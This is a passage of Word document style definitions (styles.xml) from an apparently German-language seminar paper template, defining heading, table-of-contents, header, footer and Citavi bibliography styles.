        <w:numId w:val="21"/>
      </w:numPr>
    </w:pPr>
  </w:style>
  <w:style w:type="character" w:styleId="Hyperlink">
    <w:name w:val="Hyperlink"/>
    <w:uiPriority w:val="99"/>
    <w:rsid w:val="00612451"/>
    <w:rPr>
      <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
      <w:color w:val="auto"/>
      <w:sz w:val="22"/>
      <w:u w:val="none"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="FormatvorlageAufzhlung1">
    <w:name w:val="Formatvorlage Aufzählung 1"/>
    <w:basedOn w:val="Standard"/>
    <w:rsid w:val="008957D0"/>
    <w:pPr>
      <w:numPr>
        <w:numId w:val="20"/>
      </w:numPr>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Dokumentstruktur">
    <w:name w:val="Document Map"/>
    <w:basedOn w:val="Standard"/>
    <w:link w:val="DokumentstrukturZchn"/>
    <w:semiHidden/>
    <w:rsid w:val="009366DE"/>
    <w:pPr>
      <w:shd w:val="clear" w:color="auto" w:fill="000080"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Tahoma" w:hAnsi="Tahoma" w:cs="Tahoma"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Kopfzeile">
    <w:name w:val="header"/>
    <w:basedOn w:val="Standard"/>
    <w:link w:val="KopfzeileZchn"/>
    <w:rsid w:val="002E27DE"/>
    <w:pPr>
      <w:tabs>
        <w:tab w:val="center" w:pos="4536"/>
        <w:tab w:val="right" w:pos="9072"/>
      </w:tabs>
      <w:jc w:val="both"/>
    </w:pPr>
    <w:rPr>
      <w:sz w:val="18"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Fuzeile">
    <w:name w:val="footer"/>
    <w:basedOn w:val="Standard"/>
    <w:link w:val="FuzeileZchn"/>
    <w:rsid w:val="002E27DE"/>
    <w:pPr>
      <w:tabs>
        <w:tab w:val="center" w:pos="4536"/>
        <w:tab w:val="right" w:pos="9072"/>
      </w:tabs>
      <w:jc w:val="both"/>
    </w:pPr>
    <w:rPr>
      <w:sz w:val="18"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="FuzeileZchn">
    <w:name w:val="Fußzeile Zchn"/>
    <w:link w:val="Fuzeile"/>
    <w:rsid w:val="00D416AA"/>
    <w:rPr>
      <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
      <w:sz w:val="18"/>
      <w:szCs w:val="24"/>
      <w:lang w:val="de-DE" w:eastAsia="de-DE" w:bidi="ar-SA"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="Seitenzahl">
    <w:name w:val="page number"/>
    <w:rsid w:val="001F16DC"/>
    <w:rPr>
      <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
      <w:sz w:val="16"/>
      <w:szCs w:val="18"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Verzeichnis1">
    <w:name w:val="toc 1"/>
    <w:basedOn w:val="Standard"/>
    <w:next w:val="Standard"/>
    <w:autoRedefine/>
    <w:uiPriority w:val="39"/>
    <w:rsid w:val="007F4250"/>
    <w:pPr>
      <w:tabs>
        <w:tab w:val="left" w:pos="960"/>
        <w:tab w:val="right" w:leader="dot" w:pos="9060"/>
      </w:tabs>
      <w:spacing w:before="240" w:after="60"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:cs="Arial"/>
      <w:bCs/>
      <w:szCs w:val="22"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Verzeichnis2">
    <w:name w:val="toc 2"/>
    <w:basedOn w:val="Standard"/>
    <w:next w:val="Standard"/>
    <w:autoRedefine/>
    <w:uiPriority w:val="39"/>
    <w:rsid w:val="009C4F64"/>
    <w:pPr>
      <w:spacing w:after="60"/>
      <w:ind w:left="113"/>
    </w:pPr>
    <w:rPr>
      <w:bCs/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Verzeichnis3">
    <w:name w:val="toc 3"/>
    <w:basedOn w:val="Standard"/>
    <w:next w:val="Standard"/>
    <w:autoRedefine/>
    <w:uiPriority w:val="39"/>
    <w:rsid w:val="009C4F64"/>
    <w:pPr>
      <w:tabs>
        <w:tab w:val="left" w:pos="960"/>
        <w:tab w:val="right" w:leader="dot" w:pos="9060"/>
      </w:tabs>
      <w:spacing w:after="60"/>
      <w:ind w:left="227"/>
    </w:pPr>
    <w:rPr>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Verzeichnis4">
    <w:name w:val="toc 4"/>
    <w:basedOn w:val="Standard"/>
    <w:next w:val="Standard"/>
    <w:autoRedefine/>
    <w:semiHidden/>
    <w:rsid w:val="00056E7F"/>
    <w:pPr>
      <w:spacing w:after="120"/>
      <w:ind w:left="170"/>
    </w:pPr>
    <w:rPr>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Verzeichnis5">
    <w:name w:val="toc 5"/>
    <w:basedOn w:val="Standard"/>
    <w:next w:val="Standard"/>
    <w:autoRedefine/>
    <w:semiHidden/>
    <w:rsid w:val="00A71F4D"/>
    <w:pPr>
      <w:spacing w:after="120"/>
    </w:pPr>
    <w:rPr>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Verzeichnis6">
    <w:name w:val="toc 6"/>
    <w:basedOn w:val="Standard"/>
    <w:next w:val="Standard"/>
    <w:autoRedefine/>
    <w:semiHidden/>
    <w:rsid w:val="00083224"/>
    <w:pPr>
      <w:ind w:left="960"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Verzeichnis7">
    <w:name w:val="toc 7"/>
    <w:basedOn w:val="Standard"/>
    <w:next w:val="Standard"/>
    <w:autoRedefine/>
    <w:semiHidden/>
    <w:rsid w:val="00083224"/>
    <w:pPr>
      <w:ind w:left="1200"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Verzeichnis8">
    <w:name w:val="toc 8"/>
    <w:basedOn w:val="Standard"/>
    <w:next w:val="Standard"/>
    <w:autoRedefine/>
    <w:semiHidden/>
    <w:rsid w:val="00083224"/>
    <w:pPr>
      <w:ind w:left="1440"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Verzeichnis9">
    <w:name w:val="toc 9"/>
    <w:basedOn w:val="Standard"/>
    <w:next w:val="Standard"/>
    <w:autoRedefine/>
    <w:semiHidden/>
    <w:rsid w:val="00083224"/>
    <w:pPr>
      <w:ind w:left="1680"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="Zeilennummer">
    <w:name w:val="line number"/>
    <w:basedOn w:val="Absatz-Standardschriftart"/>
    <w:rsid w:val="00E504AE"/>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Funotentext">
    <w:name w:val="footnote text"/>
    <w:basedOn w:val="Standard"/>
    <w:link w:val="FunotentextZchn"/>
    <w:semiHidden/>
    <w:rsid w:val="00DA5FB3"/>
    <w:rPr>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="Funotenzeichen">
    <w:name w:val="footnote reference"/>
    <w:semiHidden/>
    <w:rsid w:val="00DA5FB3"/>
    <w:rPr>
      <w:vertAlign w:val="superscript"/>
    </w:rPr>
  </w:style>
  <w:style w:type="table" w:styleId="Tabellenraster">
    <w:name w:val="Table Grid"/>
    <w:basedOn w:val="NormaleTabelle"/>
    <w:rsid w:val="000D6A0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prechblasentext">
    <w:name w:val="Balloon Text"/>
    <w:basedOn w:val="Standard"/>
    <w:link w:val="SprechblasentextZchn"/>
    <w:semiHidden/>
    <w:rsid w:val="00914026"/>
    <w:rPr>
      <w:rFonts w:ascii="Tahoma" w:hAnsi="Tahoma" w:cs="Tahoma"/>
      <w:sz w:val="16"/>
      <w:szCs w:val="16"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Beschriftung">
    <w:name w:val="caption"/>
    <w:basedOn w:val="Standard"/>
    <w:next w:val="Standard"/>
    <w:qFormat/>
    <w:rsid w:val="002E523E"/>
    <w:pPr>
      <w:spacing w:before="120" w:after="240"/>
    </w:pPr>
    <w:rPr>
      <w:bCs/>
      <w:color w:val="000000"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="18"/>
      <w:lang w:val="de-AT" w:eastAsia="en-US" w:bidi="en-US"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Abbildungsverzeichnis">
    <w:name w:val="table of figures"/>
    <w:basedOn w:val="Standard"/>
    <w:next w:val="Standard"/>
    <w:unhideWhenUsed/>
    <w:qFormat/>
    <w:rsid w:val="0000261A"/>
    <w:pPr>
      <w:jc w:val="both"/>
    </w:pPr>
    <w:rPr>
      <w:szCs w:val="22"/>
      <w:lang w:val="de-AT" w:eastAsia="en-US" w:bidi="en-US"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Literaturverzeichnis">
    <w:name w:val="Bibliography"/>
    <w:basedOn w:val="Standard"/>
    <w:next w:val="Standard"/>
    <w:unhideWhenUsed/>
    <w:qFormat/>
    <w:rsid w:val="002E523E"/>
    <w:pPr>
      <w:spacing w:after="200"/>
      <w:jc w:val="both"/>
    </w:pPr>
    <w:rPr>
      <w:szCs w:val="22"/>
      <w:lang w:val="de-AT" w:eastAsia="en-US" w:bidi="en-US"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="Kommentarzeichen">
    <w:name w:val="annotation reference"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00D416AA"/>
    <w:rPr>
      <w:sz w:val="16"/>
      <w:szCs w:val="16"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Kommentartext">
    <w:name w:val="annotation text"/>
    <w:basedOn w:val="Standard"/>
    <w:link w:val="KommentartextZchn"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00D416AA"/>
    <w:pPr>
      <w:spacing w:after="200"/>
      <w:jc w:val="both"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
      <w:lang w:val="de-AT" w:eastAsia="en-US" w:bidi="en-US"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="KommentartextZchn">
    <w:name w:val="Kommentartext Zchn"/>
    <w:link w:val="Kommentartext"/>
    <w:rsid w:val="00D416AA"/>
    <w:rPr>
      <w:lang w:val="de-AT" w:eastAsia="en-US" w:bidi="en-US"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="Startberschrift">
    <w:name w:val="Startüberschrift"/>
    <w:basedOn w:val="Standard"/>
    <w:next w:val="Standard"/>
    <w:link w:val="StartberschriftZchn"/>
    <w:qFormat/>
    <w:rsid w:val="00E45CD4"/>
    <w:pPr>
      <w:spacing w:after="120"/>
      <w:jc w:val="both"/>
    </w:pPr>
    <w:rPr>
      <w:b/>
      <w:sz w:val="36"/>
      <w:szCs w:val="36"/>
      <w:lang w:val="de-AT" w:eastAsia="en-US" w:bidi="en-US"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="StartberschriftZchn">
    <w:name w:val="Startüberschrift Zchn"/>
    <w:link w:val="Startberschrift"/>
    <w:rsid w:val="00E45CD4"/>
    <w:rPr>
      <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
      <w:b/>
      <w:sz w:val="36"/>
      <w:szCs w:val="36"/>
      <w:lang w:val="de-AT" w:eastAsia="en-US" w:bidi="en-US"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="DeckblattSeminararbeit">
    <w:name w:val="Deckblatt Seminararbeit"/>
    <w:basedOn w:val="Standard"/>
    <w:rsid w:val="000C35CB"/>
    <w:pPr>
      <w:tabs>
        <w:tab w:val="left" w:pos="426"/>
      </w:tabs>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:cs="Arial"/>
      <w:b/>
      <w:color w:val="FFFFFF"/>
      <w:sz w:val="40"/>
      <w:szCs w:val="40"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="DeckblattStudiengang">
    <w:name w:val="Deckblatt Studiengang"/>
    <w:basedOn w:val="Standard"/>
    <w:rsid w:val="00894018"/>
    <w:pPr>
      <w:tabs>
        <w:tab w:val="left" w:pos="426"/>
      </w:tabs>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:cs="Arial"/>
      <w:color w:val="FFFFFF"/>
      <w:sz w:val="28"/>
      <w:szCs w:val="32"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="DeckblattArbeitstitel">
    <w:name w:val="Deckblatt Arbeitstitel"/>
    <w:basedOn w:val="Standard"/>
    <w:rsid w:val="00894018"/>
    <w:rPr>
      <w:b/>
      <w:sz w:val="40"/>
      <w:szCs w:val="40"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="DeckblattAutor">
    <w:name w:val="Deckblatt Autor"/>
    <w:basedOn w:val="Standard"/>
    <w:rsid w:val="00894018"/>
    <w:pPr>
      <w:tabs>
        <w:tab w:val="left" w:pos="426"/>
      </w:tabs>
      <w:spacing w:line="276" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:cs="Arial"/>
      <w:sz w:val="26"/>
      <w:szCs w:val="26"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="Anmerkungen">
    <w:name w:val="Anmerkungen"/>
    <w:basedOn w:val="Standard"/>
    <w:qFormat/>
    <w:rsid w:val="002E523E"/>
    <w:rPr>
      <w:color w:val="008462"/>
      <w:szCs w:val="22"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Listenabsatz">
    <w:name w:val="List Paragraph"/>
    <w:basedOn w:val="Standard"/>
    <w:uiPriority w:val="34"/>
    <w:qFormat/>
    <w:rsid w:val="00C11676"/>
    <w:pPr>
      <w:ind w:left="720"/>
      <w:contextualSpacing/>
    </w:pPr>
  </w:style>
  <w:style w:type="character" w:styleId="NichtaufgelsteErwhnung">
    <w:name w:val="Unresolved Mention"/>
    <w:basedOn w:val="Absatz-Standardschriftart"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00F4625F"/>
    <w:rPr>
      <w:color w:val="605E5C"/>
      <w:shd w:val="clear" w:color="auto" w:fill="E1DFDD"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="Default">
    <w:name w:val="Default"/>
    <w:rsid w:val="00FB27D4"/>
    <w:pPr>
      <w:autoSpaceDE w:val="0"/>
      <w:autoSpaceDN w:val="0"/>
      <w:adjustRightInd w:val="0"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
      <w:color w:val="000000"/>
      <w:sz w:val="24"/>
      <w:szCs w:val="24"/>
      <w:lang w:val="de-DE"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="berschrift2Zchn">
    <w:name w:val="Überschrift 2 Zchn"/>
    <w:basedOn w:val="Absatz-Standardschriftart"/>
    <w:link w:val="berschrift2"/>
    <w:rsid w:val="009006BD"/>
    <w:rPr>
      <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
      <w:b/>
      <w:bCs/>
      <w:iCs/>
      <w:sz w:val="32"/>
      <w:szCs w:val="28"/>
      <w:lang w:val="de-DE" w:eastAsia="de-DE"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="Platzhaltertext">
    <w:name w:val="Placeholder Text"/>
    <w:basedOn w:val="Absatz-Standardschriftart"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="00EC3E80"/>
    <w:rPr>
      <w:color w:val="808080"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="CitaviBibliographyEntry">
    <w:name w:val="Citavi Bibliography Entry"/>
    <w:basedOn w:val="Standard"/>
    <w:link w:val="CitaviBibliographyEntryZchn"/>
    <w:rsid w:val="00EC3E80"/>
    <w:pPr>
      <w:tabs>
        <w:tab w:val="left" w:pos="510"/>
      </w:tabs>
      <w:ind w:left="510" w:hanging="510"/>
    </w:pPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="CitaviBibliographyEntryZchn">
    <w:name w:val="Citavi Bibliography Entry Zchn"/>
    <w:basedOn w:val="Absatz-Standardschriftart"/>
    <w:link w:val="CitaviBibliographyEntry"/>
    <w:rsid w:val="00EC3E80"/>
    <w:rPr>
      <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
      <w:sz w:val="22"/>
      <w:szCs w:val="24"/>
      <w:lang w:val="de-DE" w:eastAsia="de-DE"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="CitaviBibliographyHeading">
    <w:name w:val="Citavi Bibliography Heading"/>
    <w:basedOn w:val="berschrift1"/>
    <w:link w:val="CitaviBibliographyHeadingZchn"/>
    <w:rsid w:val="00EC3E80"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="CitaviBibliographyHeadingZchn">
    <w:name w:val="Citavi Bibliography Heading Zchn"/>
    <w:basedOn w:val="Absatz-Standardschriftart"/>
    <w:link w:val="CitaviBibliographyHeading"/>
    <w:rsid w:val="00EC3E80"/>
    <w:rPr>
      <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
      <w:b/>
      <w:bCs/>
      <w:kern w:val="32"/>
      <w:sz w:val="36"/>
      <w:szCs w:val="36"/>
      <w:lang w:val="de-DE" w:eastAsia="de-DE"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="CitaviBibliographySubheading1">
    <w:name w:val="Citavi Bibliography Subheading 1"/>
    <w:basedOn w:val="berschrift2"/>
    <w:link w:val="CitaviBibliographySubheading1Zchn"/>
    <w:rsid w:val="00EC3E80"/>
    <w:pPr>
      <w:outlineLvl w:val="9"/>
    </w:pPr>
    <w:rPr>
      <w:lang w:val="de-AT"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="CitaviBibliographySubheading1Zchn">
    <w:name w:val="Citavi Bibliography Subheading 1 Zchn"/>
    <w:basedOn w:val="Absatz-Standardschriftart"/>
    <w:link w:val="CitaviBibliographySubheading1"/>
    <w:rsid w:val="00EC3E80"/>
    <w:rPr>
      <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
      <w:b/>
      <w:bCs/>
      <w:iCs/>
      <w:sz w:val="32"/>
      <w:szCs w:val="28"/>
      <w:lang w:eastAsia="de-DE"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="CitaviBibliographySubheading2">
    <w:name w:val="Citavi Bibliography Subheading 2"/>
    <w:basedOn w:val="berschrift3"/>
    <w:link w:val="CitaviBibliographySubheading2Zchn"/>
    <w:rsid w:val="00EC3E80"/>
    <w:pPr>
      <w:outlineLvl w:val="9"/>
    </w:pPr>
    <w:rPr>
      <w:lang w:val="de-AT"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="CitaviBibliographySubheading2Zchn">
    <w:name w:val="Citavi Bibliography Subheading 2 Zchn"/>
    <w:basedOn w:val="Absatz-Standardschriftart"/>
    <w:link w:val="CitaviBibliographySubheading2"/>
    <w:rsid w:val="00EC3E80"/>
    <w:rPr>
      <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
      <w:b/>
      <w:bCs/>
      <w:sz w:val="28"/>
      <w:szCs w:val="26"/>
      <w:lang w:eastAsia="de-DE"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="CitaviBibliographySubheading3">
    <w:name w:val="Citavi Bibliography Subheading 3"/>
    <w:basedOn w:val="berschrift4"/>
    <w:link w:val="CitaviBibliographySubheading3Zchn"/>
    <w:rsid w:val="00EC3E80"/>
    <w:pPr>
      <w:outlineLvl w:val="9"/>
    </w:pPr>
    <w:rPr>
      <w:lang w:val="de-AT"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="CitaviBibliographySubheading3Zchn">
    <w:name w:val="Citavi Bibliography Subheading 3 Zchn"/>
    <w:basedOn w:val="Absatz-Standardschriftart"/>
    <w:link w:val="CitaviBibliographySubheading3"/>
    <w:rsid w:val="00EC3E80"/>
    <w:rPr>
      <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
      <w:b/>
      <w:bCs/>
      <w:sz w:val="24"/>
      <w:szCs w:val="22"/>
      <w:lang w:eastAsia="de-DE"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="CitaviBibliographySubheading4">
    <w:name w:val="Citavi Bibliography Subheading 4"/>
    <w:basedOn w:val="berschrift5"/>
    <w:link w:val="CitaviBibliographySubheading4Zchn"/>
    <w:rsid w:val="00EC3E80"/>
    <w:pPr>
      <w:outlineLvl w:val="9"/>
    </w:pPr>
    <w:rPr>
      <w:lang w:val="de-AT"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="CitaviBibliographySubheading4Zchn">
    <w:name w:val="Citavi Bibliography Subheading 4 Zchn"/>
    <w:basedOn w:val="Absatz-Standardschriftart"/>
    <w:link w:val="CitaviBibliographySubheading4"/>
    <w:rsid w:val="00EC3E80"/>
    <w:rPr>
      <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
      <w:b/>
      <w:bCs/>
      <w:iCs/>
      <w:sz w:val="26"/>
      <w:szCs w:val="26"/>
      <w:lang w:eastAsia="de-DE"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="CitaviBibliographySubheading5">
    <w:name w:val="Citavi Bibliography Subheading 5"/>
    <w:basedOn w:val="berschrift6"/>
    <w:link w:val="CitaviBibliographySubheading5Zchn"/>
    <w:rsid w:val="00EC3E80"/>
    <w:pPr>
      <w:outlineLvl w:val="9"/>
    </w:pPr>
    <w:rPr>
      <w:lang w:val="de-AT"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="CitaviBibliographySubheading5Zchn">
    <w:name w:val="Citavi Bibliography Subheading 5 Zchn"/>
    <w:basedOn w:val="Absatz-Standardschriftart"/>
    <w:link w:val="CitaviBibliographySubheading5"/>
    <w:rsid w:val="00EC3E80"/>
    <w:rPr>
      <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
      <w:bCs/>
      <w:sz w:val="22"/>
      <w:szCs w:val="22"/>
      <w:lang w:eastAsia="de-DE"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="CitaviBibliographySubheading6">
    <w:name w:val="Citavi Bibliography Subheading 6"/>
    <w:basedOn w:val="berschrift7"/>
    <w:link w:val="CitaviBibliographySubheading6Zchn"/>
    <w:rsid w:val="00EC3E80"/>
    <w:pPr>
      <w:outlineLvl w:val="9"/>
    </w:pPr>
    <w:rPr>
      <w:lang w:val="de-AT"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="CitaviBibliographySubheading6Zchn">
    <w:name w:val="Citavi Bibliography Subheading 6 Zchn"/>
    <w:basedOn w:val="Absatz-Standardschriftart"/>
    <w:link w:val="CitaviBibliographySubheading6"/>
    <w:rsid w:val="00EC3E80"/>
    <w:rPr>
      <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
      <w:sz w:val="22"/>
      <w:szCs w:val="24"/>
      <w:lang w:eastAsia="de-DE"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="CitaviBibliographySubheading7">
    <w:name w:val="Citavi Bibliography Subheading 7"/>
    <w:basedOn w:val="berschrift8"/>
    <w:link w:val="CitaviBibliographySubheading7Zchn"/>
    <w:rsid w:val="00EC3E80"/>
    <w:pPr>
      <w:outlineLvl w:val="9"/>
    </w:pPr>
    <w:rPr>
      <w:lang w:val="de-AT"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="CitaviBibliographySubheading7Zchn">
    <w:name w:val="Citavi Bibliography Subheading 7 Zchn"/>
    <w:basedOn w:val="Absatz-Standardschriftart"/>
    <w:link w:val="CitaviBibliographySubheading7"/>
    <w:rsid w:val="00EC3E80"/>
    <w:rPr>
      <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
      <w:iCs/>
      <w:sz w:val="22"/>
      <w:szCs w:val="24"/>
      <w:lang w:eastAsia="de-DE"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="CitaviBibliographySubheading8">
    <w:name w:val="Citavi Bibliography Subheading 8"/>
    <w:basedOn w:val="berschrift9"/>
    <w:link w:val="CitaviBibliographySubheading8Zchn"/>
    <w:rsid w:val="00EC3E80"/>
    <w:pPr>
      <w:outlineLvl w:val="9"/>
    </w:pPr>
    <w:rPr>
      <w:lang w:val="de-AT"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="CitaviBibliographySubheading8Zchn">
    <w:name w:val="Citavi Bibliography Subheading 8 Zchn"/>
    <w:basedOn w:val="Absatz-Standardschriftart"/>
    <w:link w:val="CitaviBibliographySubheading8"/>
    <w:rsid w:val="00EC3E80"/>
    <w:rPr>
      <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
      <w:sz w:val="22"/>
      <w:szCs w:val="22"/>
      <w:lang w:eastAsia="de-DE"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="berschrift1Zchn">
    <w:name w:val="Überschrift 1 Zchn"/>
    <w:basedOn w:val="Absatz-Standardschriftart"/>
    <w:link w:val="berschrift1"/>
    <w:rsid w:val="00071E4E"/>
    <w:rPr>
      <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
      <w:b/>
      <w:bCs/>
      <w:kern w:val="32"/>
      <w:sz w:val="36"/>
      <w:szCs w:val="36"/>
      <w:lang w:val="de-DE" w:eastAsia="de-DE"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="berschrift3Zchn">
    <w:name w:val="Überschrift 3 Zchn"/>
    <w:basedOn w:val="Absatz-Standardschriftart"/>
    <w:link w:val="berschrift3"/>
    <w:rsid w:val="00071E4E"/>
    <w:rPr>
      <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
      <w:b/>
      <w:bCs/>
      <w:sz w:val="28"/>
      <w:szCs w:val="26"/>
      <w:lang w:val="de-DE" w:eastAsia="de-DE"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="berschrift4Zchn">
    <w:name w:val="Überschrift 4 Zchn"/>
    <w:basedOn w:val="Absatz-Standardschriftart"/>
    <w:link w:val="berschrift4"/>
    <w:rsid w:val="00071E4E"/>
    <w:rPr>
      <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
      <w:b/>
      <w:bCs/>
      <w:sz w:val="24"/>
      <w:szCs w:val="22"/>
      <w:lang w:val="de-DE" w:eastAsia="de-DE"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="berschrift5Zchn">
    <w:name w:val="Überschrift 5 Zchn"/>
    <w:basedOn w:val="Absatz-Standardschriftart"/>
    <w:link w:val="berschrift5"/>
    <w:rsid w:val="00071E4E"/>
    <w:rPr>
      <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
      <w:b/>
      <w:bCs/>
      <w:iCs/>
      <w:sz w:val="26"/>
      <w:szCs w:val="26"/>
      <w:lang w:val="de-DE" w:eastAsia="de-DE"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="berschrift6Zchn">
    <w:name w:val="Überschrift 6 Zchn"/>
    <w:basedOn w:val="Absatz-Standardschriftart"/>
    <w:link w:val="berschrift6"/>
    <w:rsid w:val="00071E4E"/>
    <w:rPr>
      <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
      <w:bCs/>
      <w:sz w:val="22"/>
      <w:szCs w:val="22"/>
      <w:lang w:val="de-DE" w:eastAsia="de-DE"/>
